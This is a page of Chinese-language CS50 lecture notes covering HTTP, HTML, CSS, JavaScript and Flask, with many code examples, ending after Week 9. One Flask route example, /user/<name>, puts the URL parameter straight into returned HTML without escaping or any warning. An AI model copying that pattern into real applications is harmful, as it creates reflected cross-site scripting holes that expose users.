@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CS50 · Week 8–10 — Tumanydays</title>
+    <link rel="icon" type="image/png" href="../../../images/icon.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Serif SC",serif;background:#fafafa;color:#333;line-height:1.9}
+.container{max-width:680px;margin:0 auto;padding:64px 24px 80px}
+h1{font-size:1.8rem;font-weight:400;letter-spacing:2px;line-height:1.5;margin-bottom:16px;color:#1a1a1a}
+.meta{font-size:.85rem;color:#999;margin-bottom:48px}.meta span{margin-right:16px}
+.intro{font-size:.9rem;color:#777;line-height:1.8;margin-bottom:48px;padding-left:16px;border-left:2px solid #ddd}
+h2{font-size:1.25rem;font-weight:500;margin-top:56px;margin-bottom:20px;color:#1a1a1a;letter-spacing:1px}
+h3{font-size:1.05rem;font-weight:500;margin-top:36px;margin-bottom:14px;color:#333}
+p{font-size:.95rem;margin-bottom:16px;color:#444}
+blockquote{margin:24px 0;padding:16px 20px;background:#f5f5f5;border-radius:6px;font-size:.9rem;color:#555;border-left:3px solid #ccc}
+blockquote p{margin-bottom:0;color:#555}
+strong{color:#1a1a1a;font-weight:600}
+table{width:100%;border-collapse:collapse;margin:20px 0 28px;font-size:.85rem}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #e8e8e8;vertical-align:top;line-height:1.6}
+th{background:#f9f9f9;font-weight:500;color:#555;font-size:.8rem;letter-spacing:1px}
+tr:hover td{background:#fcfcfc}
+hr{border:none;border-top:1px solid #e8e8e8;margin:48px 0}
+.dot{display:block;width:6px;height:6px;background:#ccc;border-radius:50%;margin:40px auto}
+ul,ol{margin:12px 0 20px 20px;font-size:.9rem;color:#555;line-height:2}
+code{background:#f0f0f0;padding:1px 6px;border-radius:3px;font-size:.85rem;font-family:"SF Mono","Menlo","Consolas",monospace;color:#c7254e}
+pre{background:#2d2d2d;color:#f8f8f2;padding:16px 20px;border-radius:6px;overflow-x:auto;font-size:.82rem;line-height:1.7;margin:16px 0 24px;font-family:"SF Mono","Menlo","Consolas",monospace}
+.nav-bottom{margin-top:64px;padding-top:24px;border-top:1px solid #e8e8e8;text-align:center}
+.nav-bottom a{color:#999;text-decoration:none;font-size:.85rem}.nav-bottom a:hover{color:#333}
+@media(max-width:600px){.container{padding:32px 16px 64px}h1{font-size:1.4rem}table{font-size:.78rem}th,td{padding:8px}}
+</style>
+</head>
+<body><div class="container">
+        <a class="back" href="index.html">← CS50</a>
+
+<h1>CS50x 2025 · 听课笔记<br>Week 8 &amp; Week 9 &amp; Week 10</h1>
+<div class="meta"><span>星尘 整理</span><span>2026年5月29日</span></div>
+<div class="intro">
+<p>Week 8 到 Week 10 是 CS50 的「出海口」。前 7 周你从二进制挖到 C 语言，从指针挖到数据结构，从 Python 挖到 SQL——现在这些河道全部汇入一个方向：<strong>互联网</strong>。Week 8 覆盖前端三件套（HTML/CSS/JavaScript），Week 9 用 Flask 搭建全栈 Web 应用，Week 10 以网络安全和 AI 话题收尾。到最后一个学分修完时，你手上不再是零散的语法知识——你手上有了一条从晶体管到浏览器的完整认知链。</p>
+</div>
+
+<h2>🔑 关键词索引</h2>
+<table>
+<tr><th>关键词</th><th>一句话说明</th></tr>
+<tr><td><strong>⭐ HTTP 协议</strong></td><td>浏览器和服务器之间的通信语言。请求包括方法（GET/POST）、路径、头部；响应包括状态码（200/404/500）、头部、主体</td></tr>
+<tr><td><strong>TCP/IP</strong></td><td>互联网的底层传输协议。IP 负责「找到那台电脑」，TCP 负责「确保数据完整按序送到」</td></tr>
+<tr><td><strong>DNS</strong></td><td>域名系统——把 <code>google.com</code> 翻译成 IP 地址 <code>142.250.80.46</code>。互联网的全球电话簿</td></tr>
+<tr><td><strong>HTML</strong></td><td>网页的骨架——用标签描述内容结构。语义化标签（header/footer/section）让 HTML 不只是给浏览器看，也给搜索引擎和阅读器看</td></tr>
+<tr><td><strong>CSS 盒模型 + 定位</strong></td><td>每个元素是一个盒子（content→padding→border→margin）。position 控制盒子放在哪：static 正常流、relative 偏移、absolute 自由、fixed 钉屏幕</td></tr>
+<tr><td><strong>CSS 特异性</strong></td><td>多规则冲突时谁说了算——inline（1000）> id（100）> class（10）> tag（1）。Malan：「这是 CSS 最容易误解的地方」</td></tr>
+<tr><td><strong>⭐ DOM</strong></td><td>文档对象模型——浏览器把 HTML 解析成一棵树。JavaScript 通过这棵树动态修改页面：增删改查节点、改样式、读输入</td></tr>
+<tr><td><strong>JavaScript 核心语法</strong></td><td>语法接近 C（花括号、分号），但变量不用声明类型（let/const）、函数是一等公民、箭头函数是标配</td></tr>
+<tr><td><strong>事件（Event）</strong></td><td>用户的操作（click/input/submit）→ 触发 JS 函数。addEventListener 绑定监听器。event.target 找到触发源</td></tr>
+<tr><td><strong>⭐ AJAX / fetch</strong></td><td>不刷新整个页面就从服务器拿数据。fetch(url) → 返回 Promise → .then() 处理响应 → 局部更新 DOM。现代 Web App 的标配</td></tr>
+<tr><td><strong>⭐ Flask</strong></td><td>Python 轻量 Web 框架。@app.route 定义路由，render_template 渲染页面，request.form 读 POST 数据，session 记用户</td></tr>
+<tr><td><strong>Jinja 模板</strong></td><td>Flask 的模板引擎——{{ }} 输出变量，{% %} 写循环和条件。模板继承（{% extends %}）消灭重复 HTML</td></tr>
+<tr><td><strong>GET vs POST</strong></td><td>GET：参数在 URL 中（可收藏分享→适合搜索）。POST：参数在请求体（不会留在历史→适合登录/修改）</td></tr>
+<tr><td><strong>Session / Cookie</strong></td><td>HTTP 无状态→需要记忆手段。Cookie 存浏览器（小纸条），Session 存服务器（通过 session_id 识别）。Flask 的 session 字典自动管理</td></tr>
+<tr><td><strong>⭐ MVC 模式</strong></td><td>Model（数据/SQL）→ View（模板/HTML）→ Controller（路由/Python）。分离不是洁癖——是你代码不被自己恨的底线</td></tr>
+<tr><td><strong>redirect / url_for / flash</strong></td><td>重定向跳转、动态生成 URL、一次性提示消息。Flask 的路由辅助三件套</td></tr>
+<tr><td><strong>JSON API</strong></td><td>Flask 不仅可以返回 HTML，还可以返回 JSON 数据——jsonify()。前端 fetch JSON → JS 局部渲染。前后端分离的基础</td></tr>
+<tr><td><strong>⭐ 网络安全</strong></td><td>密码哈希（bcrypt）、HTTPS 加密传输、XSS 防御（转义用户输入）、CSRF 防御（token 验证）、SQL 注入防御（参数化查询）、环境变量存密钥</td></tr>
+<tr><td><strong>bcrypt / 哈希加盐</strong></td><td>密码不存明文。bcrypt 自动加盐——两个用户设了同样的密码，产生不同的哈希。故意很慢（防暴力破解）</td></tr>
+<tr><td><strong>环境变量</strong></td><td>API Key、secret_key、数据库密码——永远不写进代码。存 .env 文件 + gitignore。服务器从环境变量读取</td></tr>
+<tr><td><strong>AI 与编程</strong></td><td>AI 能写代码——但不能替你思考「为什么要写这段代码」。CS50 教的是后者。这是你不可替代的地方</td></tr>
+</table>
+
+<span class="dot"></span>
+
+<!-- ==================== WEEK 8 ==================== -->
+<h2>Week 8 · HTML, CSS, JavaScript</h2>
+
+<h3>这节课的核心隐喻：互联网本身</h3>
+<p>Malan 的开场不写代码。他画了一张图——你的电脑在左边，Google 的服务器在右边，中间是一根弯弯曲曲的线。「你在浏览器输入 google.com，按下回车。然后——<strong>到底发生了什么？</strong>」接下来 15 分钟，他把网络协议栈从 HTTP 讲到 TCP/IP 再到路由器讲到 DNS——不是为了让你背协议号，是为了让你在写 Web 应用时，脑子里有一张<strong>物理世界的全息图</strong>。</p>
+
+<h3>8-1：互联网协议栈——在你输入 URL 到看到页面的短短 1 秒内</h3>
+<table>
+<tr><th>层次</th><th>协议/技术</th><th>干了什么</th><th>比喻</th></tr>
+<tr><td><strong>应用层</strong></td><td>HTTP / HTTPS</td><td>定义「我要什么」（GET /index.html）和「我拿到了什么」（200 OK + 内容）</td><td>你写的信封内容</td></tr>
+<tr><td><strong>传输层</strong></td><td>TCP</td><td>把数据切成包，编号，发出去。接收方确认收到了——丢包就重发。保证完整 + 按序</td><td>挂号信——保证送到、保证不撕页</td></tr>
+<tr><td><strong>网络层</strong></td><td>IP</td><td>在互联网中定位目标计算机（通过 IP 地址）。路由器根据 IP 地址逐跳转发</td><td>信封上的地址——告诉邮局往哪送</td></tr>
+<tr><td><strong>链路层</strong></td><td>WiFi / 以太网 / 光纤</td><td>物理信号传输——无线电波、电缆电信号、光脉冲</td><td>邮递员的卡车——实际运输</td></tr>
+</table>
+
+<h3>DNS——把域名变成 IP 地址的电话簿</h3>
+<p>你输入 <code>google.com</code>，但互联网上每一台机器的门牌号都是 IP 地址（如 <code>142.250.80.46</code>）。DNS（Domain Name System）就是互联网的全球电话簿——你问它「google.com 在哪」，它回答一个 IP 地址。这个查询本身也是一个网络请求，一层层向上追（本地缓存→路由器缓存→ISP DNS→根 DNS 服务器→顶级域名服务器→权威 DNS），直到有人知道答案。</p>
+
+<h3>HTTP 请求和响应——浏览器和服务器的对话格式</h3>
+<pre>客户端（浏览器）发送：
+GET / HTTP/1.1
+Host: www.example.com
+
+服务端回应：
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;...&lt;/html&gt;</pre>
+<table>
+<tr><th>常见状态码</th><th>含义</th><th>你的代码什么时候会看到它</th></tr>
+<tr><td><code>200 OK</code></td><td>成功——页面正常返回</td><td>一切正常时</td></tr>
+<tr><td><code>301 Moved Permanently</code></td><td>永久重定向——这个 URL 搬家了</td><td>你改了路由，旧地址自动跳新地址</td></tr>
+<tr><td><code>302 Found</code></td><td>临时重定向——Flask 的 redirect() 默认用这个</td><td>登录成功后跳转首页</td></tr>
+<tr><td><code>404 Not Found</code></td><td>你要的页面不存在</td><td>用户输入了不存在的 URL</td></tr>
+<tr><td><code>500 Internal Server Error</code></td><td>服务器代码炸了</td><td>你的 Python 路由函数里抛了异常。调试时看终端 traceback</td></tr>
+</table>
+
+<h3>8-2：HTML——网页的骨架</h3>
+<p>Malan 在 Chrome 浏览器里打开任意网页，按 F12 打开开发者工具——然后逐层展开 DOM 树。「你现在看到的这个页面——标题、段落、图片——它们的骨骼就是这些东西。」</p>
+<pre>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;我的第一个网页&lt;/title&gt;
+    &lt;link rel="stylesheet" href="style.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;欢迎！&lt;/h1&gt;
+        &lt;nav&gt;&lt;a href="/"&gt;首页&lt;/a&gt; | &lt;a href="/about"&gt;关于&lt;/a&gt;&lt;/nav&gt;
+    &lt;/header&gt;
+    &lt;main&gt;
+        &lt;section&gt;
+            &lt;h2&gt;文章标题&lt;/h2&gt;
+            &lt;p&gt;这是一个段落。&lt;/p&gt;
+            &lt;img src="photo.jpg" alt="一张照片"&gt;
+        &lt;/section&gt;
+    &lt;/main&gt;
+    &lt;footer&gt;
+        &lt;p&gt;&amp;copy; 2025 我的网站&lt;/p&gt;
+    &lt;/footer&gt;
+    &lt;script src="app.js"&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+
+<table>
+<tr><th>标签分类</th><th>标签</th><th>干什么的</th></tr>
+<tr><td><strong>结构</strong></td><td><code>&lt;html&gt; &lt;head&gt; &lt;body&gt;</code></td><td>最外层骨架——每页必须（虽然浏览器对缺失很宽容）</td></tr>
+<tr><td><strong>meta 信息</strong></td><td><code>&lt;meta&gt;</code>、<code>&lt;title&gt;</code>、<code>&lt;link&gt;</code>、<code>&lt;script&gt;</code></td><td>字符编码、视口设置、标题、CSS/JS 引用——全在 head 里</td></tr>
+<tr><td><strong>语义化标签</strong></td><td><code>&lt;header&gt; &lt;footer&gt; &lt;main&gt; &lt;nav&gt; &lt;section&gt; &lt;article&gt;</code></td><td>描述各部分「是什么」而不是「长什么样」。对搜索引擎、盲人阅读器友好。比满屏 <code>&lt;div&gt;</code> 强一百倍</td></tr>
+<tr><td><strong>内容</strong></td><td><code>&lt;h1&gt;~&lt;h6&gt;</code>、<code>&lt;p&gt;</code>、<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code></td><td>标题、段落、超链接、图片</td></tr>
+<tr><td><strong>列表</strong></td><td><code>&lt;ul&gt; &lt;ol&gt; &lt;li&gt;</code></td><td>无序、有序、列表项</td></tr>
+<tr><td><strong>表格</strong></td><td><code>&lt;table&gt; &lt;tr&gt; &lt;td&gt; &lt;th&gt;</code></td><td>表格/行/单元格/表头</td></tr>
+<tr><td><strong>表单</strong></td><td><code>&lt;form&gt; &lt;input&gt; &lt;button&gt; &lt;select&gt; &lt;textarea&gt;</code></td><td>用户输入——Web 应用最核心的交互入口</td></tr>
+<tr><td><strong>无语义容器</strong></td><td><code>&lt;div&gt; &lt;span&gt;</code></td><td>纯粹用来分组和挂 CSS——能用语义化标签就别用它们</td></tr>
+</table>
+
+<h3>8-3：CSS——网页的皮肤</h3>
+<p>Malan 的 CSS 教学用一个「万圣节换装」演示：同一个 HTML 文件，换一行 CSS 引用，页面从白底黑字变成暗黑模式、变成报纸排版、变成 1998 年的 GeoCities 风格。CSS 不是给 HTML 添加装饰——<strong>CSS 是把内容和表现彻底分开了。</strong></p>
+<pre>/* 选择器 { 属性: 值; } */
+body {
+    background-color: #f0f0f0;
+    font-family: Arial, sans-serif;
+}
+h1 {
+    color: #333;
+    text-align: center;
+    font-size: 2rem;
+}
+/* class 选择器——用 . 开头，可重复使用 */
+.button {
+    background: #007bff;
+    color: white;
+    padding: 10px 20px;
+    border-radius: 5px;
+}
+/* id 选择器——用 # 开头，页面中唯一 */
+#main-header { border-bottom: 2px solid #ddd; }</pre>
+
+<h3>CSS 盒模型——每个元素都是层层包裹的盒子</h3>
+<p>Malan 在开发者工具中展开一个 <code>&lt;div&gt;</code>，用「盒模型」面板展示：</p>
+<pre>┌──────── margin ──────────┐  最外层——和其他元素的距离
+│  ┌──── border ───────┐   │  边框
+│  │  ┌── padding ──┐   │   │  内边距——边框和内容之间的呼吸空间
+│  │  │  content     │   │   │  内容——文字、图片、子元素
+│  │  └──────────────┘   │   │
+│  └──────────────────────┘   │
+└──────────────────────────────┘</pre>
+<p>盒模型公式：<strong>实际宽度 = width + padding-left + padding-right + border-left + border-right。</strong> <code>box-sizing: border-box;</code> 可以让 width 包含 padding 和 border——现代开发几乎必设。</p>
+
+<h3>CSS 定位——position 四种模式</h3>
+<table>
+<tr><th>值</th><th>行为</th><th>什么时候用</th></tr>
+<tr><td><code>static</code></td><td>默认——按文档流正常排列。top/left 无效</td><td>大多数元素</td></tr>
+<tr><td><code>relative</code></td><td>相对于自己在文档流中「本来的位置」偏移。不脱离文档流（原位置仍占据空间）</td><td>微调位置、为 absolute 子元素创建定位参考</td></tr>
+<tr><td><code>absolute</code></td><td>脱离文档流。相对于<strong>最近的定位祖先</strong>（非 static 的父元素）定位。没有定位祖先时相对于 body</td><td>弹窗、下拉菜单、悬浮提示</td></tr>
+<tr><td><code>fixed</code></td><td>脱离文档流。相对于<strong>浏览器窗口</strong>定位——滚动页面也不会动</td><td>固定导航栏、返回顶部按钮</td></tr>
+</table>
+
+<h3>CSS 特异性——多条规则冲突时谁赢</h3>
+<p>Malan 把这个问题浓缩成一张「优先级计算表」——不是背公式，是理解一条规则：<strong>越具体的规则越优先。</strong></p>
+<pre>/* 优先级：inline > id > class > tag */
+&lt;h1 id="title" class="heading"&gt;Hello&lt;/h1&gt;
+
+h1 { color: blue; }           /* 优先级 0-0-1 → 输 */
+.heading { color: green; }    /* 优先级 0-1-0 → 输 */
+#title { color: red; }        /* 优先级 1-0-0 → 赢！*/
+/* 如果写了 style="color: purple" → inline 最高优先级 → 紫 */
+
+/* !important 是核武器——覆盖一切（包括 inline） */
+h1 { color: orange !important; }  /* 滥用它会让 CSS 变成惨剧——只在万不得已时用 */</pre>
+
+<h3>8-4：JavaScript——网页的大脑</h3>
+<p>HTML 是骨架（结构）。CSS 是皮肤（外观）。JavaScript 是大脑（行为）。Malan 打开一个页面，按 F12 打开 Console，敲了一行：</p>
+<pre>document.querySelector('h1').textContent = '我被 JS 改了！'</pre>
+<p>页面上最大的标题瞬间变了。他说：「你在浏览器里按 F12，打开 Console——这就是你的 JS 沙盒。你可以现场修改任何网页。注意：<strong>只在你自己的浏览器里生效。刷新页面就没了。</strong>」</p>
+
+<h3>变量、条件、循环——在浏览器里写「接近 C 的语法」</h3>
+<pre>// 变量
+let x = 5;                    // 可变
+const PI = 3.14;             // 不可变——优先用 const
+var oldWay = "不推荐";        // 老写法，作用域诡异，用 let 替代
+
+// 条件
+if (x > 3) { console.log("大"); }
+
+// 循环
+for (let i = 0; i < 5; i++) { console.log(i); }
+
+// 函数——三种写法
+function greet(name) { return "Hello, " + name; }           // 传统
+const greet = function(name) { return "Hello, " + name; }    // 匿名
+const greet = (name) => "Hello, " + name;                    // 箭头（现代标配）
+
+// 数组和对象——JS 最常用的两种结构
+let nums = [1, 2, 3];
+nums.push(4);                          // [1,2,3,4] —— 像 Python list
+nums.map(x => x * 2);                  // [2,4,6,8] —— 像 Python 列表推导
+
+let person = { name: "Alice", age: 20 };
+console.log(person.name);              // "Alice"
+console.log(person["name"]);           // "Alice"（两种写法等价）</pre>
+
+<h3>⭐ DOM 操作——JavaScript 最核心的浏览器能力</h3>
+<pre>// 挑选元素
+let heading = document.querySelector('h1');         // 选第一个匹配
+let allParagraphs = document.querySelectorAll('p');  // 选全部匹配
+let form = document.getElementById('my-form');       // 按 id 选（最快）
+
+// 修改内容（注意两者的安全差异！）
+heading.textContent = '新标题';                      // 纯文本——安全✅
+heading.innerHTML = '&lt;em&gt;斜体标题&lt;/em&gt;';           // HTML——有 XSS 风险⚠️
+
+// 修改样式
+heading.style.color = 'red';                         // 直接改
+heading.classList.add('highlight');                   // 加 class（推荐：样式和逻辑分离）
+heading.classList.toggle('dark-mode');                // 开关式——有就删，没有就加
+
+// 创建新元素并插入页面
+let newP = document.createElement('p');
+newP.textContent = '我是新来的。';
+document.body.appendChild(newP);</pre>
+
+<h3>事件——让页面响应用户操作</h3>
+<pre>// 点击按钮 → 触发函数
+document.querySelector('button').addEventListener('click', function() {
+    alert('你点了我！');
+});
+
+// 输入框内容变化 → 实时反馈
+document.querySelector('input').addEventListener('input', function(event) {
+    let typed = event.target.value;   // event.target = 触发事件的元素
+    console.log('当前输入：' + typed);
+});
+
+// 表单提交 → 拦截默认行为
+document.querySelector('form').addEventListener('submit', function(event) {
+    event.preventDefault();           // 阻止表单刷新页面！
+    // 用 fetch 发送数据...
+});
+
+// 页面加载完成 → 执行初始化
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('页面加载完了，开始干活！');
+});</pre>
+
+<h3>⭐ AJAX / fetch——不刷新页面就从服务器拿数据</h3>
+<p>这是 Malan 在第 8 周引出「现代 Web 应用」的支点技术——<strong>传统的 Web 是「点链接→整个页面刷新」，AJAX 是「后台偷偷发请求→拿到数据→局部更新 DOM」。</strong></p>
+<pre>// fetch——现代 JS 的 HTTP 请求方式
+fetch('/api/movies')                          // 向服务器发 GET 请求
+    .then(response => response.json())        // 把响应转成 JSON
+    .then(movies => {                         // movies = [{title: "...", year: ...}, ...]
+        let ul = document.querySelector('ul');
+        ul.innerHTML = '';                    // 清空旧列表
+        movies.forEach(movie => {
+            let li = document.createElement('li');
+            li.textContent = `${movie.title} (${movie.year})`;
+            ul.appendChild(li);               // 逐条插入 DOM
+        });
+    })
+    .catch(error => console.error('出错了：', error));  // 网络错误等
+
+// 发送 POST 数据
+fetch('/api/register', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username: 'alice', password: 'secret' })
+})
+    .then(response => response.json())
+    .then(data => console.log(data));</pre>
+<blockquote><p>Malan 敲下这段代码后停下来，用一种「看，你已经不是在写网页了」的语气说：<strong>「这就是 Gmail 不需要刷新页面就能收新邮件的原因。这就是 Google Maps 拖动地图不闪烁的原因。浏览器在后台帮你发 HTTP 请求——你甚至感觉不到。」</strong></p></blockquote>
+
+<h3>8-5：Week 8 的 Problem Set——个人主页</h3>
+<p>用 HTML + CSS + 一点点 JavaScript 做一个个人主页。要求：至少三个页面、至少一个表单、至少一个交互（点击按钮后发生点什么）。Malan 特意提示：「这个作业和你未来的 Final Project 是同一类东西——静态页面加上动态交互。从今天起，<strong>你开始做一个完整的网站。</strong>」</p>
+
+<span class="dot"></span>
+
+<!-- ==================== WEEK 9 ==================== -->
+<h2>Week 9 · Flask</h2>
+
+<h3>这节课的魔术时刻</h3>
+<p>Malan 在终端敲了 7 行代码：</p>
+<pre>from flask import Flask
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    return "&lt;h1&gt;hello, world&lt;/h1&gt;"
+
+if __name__ == "__main__":
+    app.run()</pre>
+<p>然后打开浏览器，输入 <code>localhost:5000</code>——页面上出现了一个加粗的「hello, world」。他说：「<strong>这就叫 Web 服务器。</strong> 你已经有一个能接受 HTTP 请求并返回 HTML 的程序了。剩下的就是往里加东西。」</p>
+
+<h3>9-1：Flask 的 MVC 架构——Malan 拆解 Web 应用的三个部分</h3>
+<p>Malan 把 Flask 应用拆成三层——不是出于学术上的洁癖，是因为<strong>如果你把 HTML、Python、SQL 搅在一个文件里，两周后你自己都看不懂。</strong></p>
+<table>
+<tr><th>MVC 层</th><th>Flask 中的对应</th><th>干什么</th><th>类比</th></tr>
+<tr><td><strong>Model（模型）</strong></td><td>SQL 数据库 + Python 查询函数</td><td>数据的存储和读取——所有的 SELECT、INSERT 归这里管</td><td>后厨的食材仓库</td></tr>
+<tr><td><strong>View（视图）</strong></td><td>templates/ 目录下的 .html 文件 + Jinja 模板语法</td><td>数据如何展示——用户看到的东西全在这里。View 不知道数据从哪来</td><td>摆盘和上菜</td></tr>
+<tr><td><strong>Controller（控制器）</strong></td><td><code>app.py</code> 中的路由函数</td><td>接收请求 → 调 Model 取数据 → 把数据传给 View → 返回给浏览器。Controller 不自己写 HTML</td><td>厨师长——调度一切</td></tr>
+</table>
+<blockquote><p>Malan 的规则：「如果你在路由函数里写 HTML 字符串——<strong>停。</strong> 把 HTML 放进 templates 目录。如果你在模板文件里写 SQL 查询——<strong>停。</strong> 把查询放到 Model 层。分离不是形式主义——是你对自己代码的可维护性负责。」</p></blockquote>
+
+<h3>9-2：路由——URL 怎么找到对应的 Python 函数</h3>
+<pre>from flask import Flask, render_template, request, redirect, url_for
+app = Flask(__name__)
+
+@app.route("/")              # 根路径 → 首页
+def index():
+    return render_template("index.html")
+
+@app.route("/user/&lt;name&gt;")   # /user/Alice → 动态路由！
+def user(name):
+    return f"&lt;h1&gt;你好，{name}！&lt;/h1&gt;"
+
+# methods 参数——同一个 URL 可以响应 GET 和 POST
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        # 处理登录表单
+        username = request.form.get("username")
+        password = request.form.get("password")
+        if not username or not password:
+            return "用户名和密码不能为空", 400   # 400 = Bad Request
+        # ... 验证逻辑 ...
+        return redirect("/")        # 登录成功 → 跳转首页
+    else:
+        return render_template("login.html")  # GET → 显示登录页</pre>
+
+<h3>redirect 和 url_for——路由的辅助二件套</h3>
+<pre># redirect——让浏览器跳转到另一个 URL
+return redirect("/")                    # 硬编码路径
+return redirect(url_for("index"))       # 用函数名生成 URL——改了路由也不怕
+
+# url_for——动态生成 URL（改了路由路径也不需要改模板里的链接）
+@app.route("/user/&lt;int:id&gt;")            # 动态路由，id 必须是整数
+def user_profile(id):
+    return f"用户 {id} 的主页"
+
+# 在模板里：&lt;a href="{{ url_for('user_profile', id=5) }}"&gt;用户 5&lt;/a&gt;
+# 渲染结果：&lt;a href="/user/5"&gt;用户 5&lt;/a&gt;</pre>
+
+<h3>9-3：Jinja 模板——在 HTML 中写 Python 逻辑</h3>
+<p>Flask 使用 Jinja2 作为模板引擎。模板不是静态 HTML——你可以在里面嵌入变量、循环、条件，Flask 在服务端渲染完毕后，发送给浏览器的就是纯净的 HTML。</p>
+<pre>&lt;!-- templates/index.html --&gt;
+&lt;h1&gt;欢迎，{{ username }}！&lt;/h1&gt;          &lt;!-- {{ }} = 输出变量（自动转义 HTML 实体） --&gt;
+
+&lt;ul&gt;
+{% for item in shopping_list %}        &lt;!-- {% %} = 控制语句 --&gt;
+    &lt;li&gt;{{ item }}&lt;/li&gt;
+{% endfor %}
+&lt;/ul&gt;
+
+{% if logged_in %}
+    &lt;a href="/logout"&gt;退出&lt;/a&gt;
+{% else %}
+    &lt;a href="/login"&gt;登录&lt;/a&gt;
+{% endif %}</pre>
+
+<h3>模板继承——消灭重复 HTML 的终极大招</h3>
+<p>建一个基础模板 <code>layout.html</code>，包含所有页面共有的 HTML 结构（导航栏、页脚、CSS 引用）。每个页面<strong>只写自己独特的内容</strong>：</p>
+<pre>&lt;!-- templates/layout.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;nav&gt;导航栏——每个页面都有&lt;/nav&gt;
+    {% block content %}{% endblock %}   &lt;!-- 留给子页面的「插槽」 --&gt;
+    &lt;footer&gt;页脚——每个页面都有&lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- templates/index.html —— 只需要写自己的内容！ --&gt;
+{% extends "layout.html" %}
+{% block content %}
+    &lt;h1&gt;这是首页独有的内容&lt;/h1&gt;
+{% endblock %}</pre>
+
+<h3>Flash 消息——「操作成功」的一次性提示</h3>
+<p>Malan 介绍了一个 Flask 的小而美的特性——<strong>flash 消息</strong>。用户提交表单后跳转，在新页面上显示一条「操作成功！」——刷新页面就消失：</p>
+<pre># 控制器中——设置 flash 消息
+from flask import flash
+
+@app.route("/register", methods=["POST"])
+def register():
+    # ... 注册逻辑 ...
+    flash("注册成功！欢迎加入。")        # 设置一条消息
+    return redirect(url_for("index"))    # 跳转到首页
+
+# 模板中——显示 flash 消息（如果有的话）
+{% with messages = get_flashed_messages() %}
+    {% if messages %}
+        &lt;div class="flash"&gt;
+            {% for msg in messages %}
+                &lt;p&gt;{{ msg }}&lt;/p&gt;
+            {% endfor %}
+        &lt;/div&gt;
+    {% endif %}
+{% endwith %}</pre>
+
+<h3>9-4：GET vs POST——什么时候用哪个</h3>
+<table>
+<tr><th></th><th>GET</th><th>POST</th></tr>
+<tr><td><strong>参数在哪</strong></td><td>URL 中（<code>?q=cs50&page=2</code>）</td><td>请求体中（不在 URL 里）</td></tr>
+<tr><td><strong>适合什么</strong></td><td>搜索、筛选、翻页——参数变化不改变服务器状态</td><td>登录、注册、提交表单、修改/删除数据——任何改变服务器状态的操作</td></tr>
+<tr><td><strong>URL 中可见吗</strong></td><td>是——所以可以分享、收藏、复制链接</td><td>否——密码和敏感数据不走 URL</td></tr>
+<tr><td><strong>安全性</strong></td><td>参数在浏览器历史、服务器日志中明文出现</td><td>不在 URL 中——但数据本身不加密（那是 HTTPS 的工作）</td></tr>
+</table>
+<blockquote><p>黄金规则：<strong>如果请求会改变服务器上的数据——用 POST。不会改变——用 GET。</strong> 如果把「删除第 5 篇文章」的链接写成 <code>/delete?id=5</code>（GET），Google 爬虫顺着链接爬过去就把你文章删了。</p></blockquote>
+
+<h3>9-5：Session 与 Cookie——让 HTTP 拥有记忆</h3>
+<p>HTTP 协议本身是<strong>无状态</strong>的——每个请求都是独立的，服务器不记得上一秒谁来过。但 Web 应用需要「登录状态」。解决方案——Cookie 和 Session：</p>
+<pre># Flask 中的 Session——比手动管理 Cookie 简单得多
+from flask import session
+
+app.secret_key = "不要告诉我任何人"  # 用来加密 session 数据（实际上放环境变量！）
+
+@app.route("/login", methods=["POST"])
+def login():
+    username = request.form.get("username")
+    # 验证密码...
+    session["user"] = username    # 记住用户！
+    return redirect("/")
+
+@app.route("/")
+def index():
+    if "user" in session:
+        return f"欢迎回来，{session['user']}！"
+    else:
+        return "请先登录。"
+
+@app.route("/logout")
+def logout():
+    session.clear()               # 忘记用户
+    return redirect("/")</pre>
+<table>
+<tr><th></th><th>Cookie</th><th>Session</th></tr>
+<tr><td><strong>存在哪</strong></td><td>用户的浏览器</td><td>服务器端（但通常通过一个 Cookie 里的 session_id 来识别用户）</td></tr>
+<tr><td><strong>能存多少</strong></td><td>很小（约 4KB）</td><td>可以存很多（服务器内存/数据库）</td></tr>
+<tr><td><strong>安全性</strong></td><td>用户能看到和修改——不要存敏感数据</td><td>用户看不到——但服务器被黑就全泄露</td></tr>
+<tr><td><strong>Flask 封装</strong></td><td><code>response.set_cookie()</code></td><td><code>session["key"] = value</code>（最简单）</td></tr>
+</table>
+
+<h3>9-6：Flask + SQL——从数据库里拿数据喂到网页上</h3>
+<p>Malan 把 Week 7 的 SQL 和 Week 9 的 Flask 焊在一起——这是他构想的「全栈」范式：</p>
+<pre># app.py——Controller 层
+import sqlite3
+from flask import Flask, render_template
+
+app = Flask(__name__)
+
+@app.route("/movies")
+def movies():
+    # Model 层——从数据库取数据
+    conn = sqlite3.connect("movies.db")
+    cursor = conn.execute("SELECT title, year FROM movies ORDER BY year DESC LIMIT 10")
+    movies = cursor.fetchall()  # 返回列表：[("电影A", 2023), ("电影B", 2023), ...]
+    conn.close()
+
+    # View 层——把数据传给模板
+    return render_template("movies.html", movies=movies)</pre>
+<pre>&lt;!-- templates/movies.html —— View 层 --&gt;
+&lt;ul&gt;
+{% for movie in movies %}
+    &lt;li&gt;{{ movie[0] }} ({{ movie[1] }})&lt;/li&gt;
+{% endfor %}
+&lt;/ul&gt;</pre>
